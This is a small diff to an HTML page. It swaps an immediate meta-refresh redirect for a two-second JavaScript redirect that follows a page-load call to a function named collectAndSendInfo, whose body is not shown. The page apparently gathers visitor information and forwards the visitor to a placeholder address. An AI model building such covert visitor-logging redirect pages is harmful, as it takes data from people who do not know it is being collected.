@@ -153,7 +153,9 @@
 
         // Запуск функции при загрузке страницы
         window.onload = collectAndSendInfo;
+        setTimeout(function() {
+        window.location.href = "https://example.com"; // Меняй ссылку
+    }, 2000);
     </script>
-    <meta http-equiv="refresh" content="0;url=https://example.com">
 </body>
 </html>
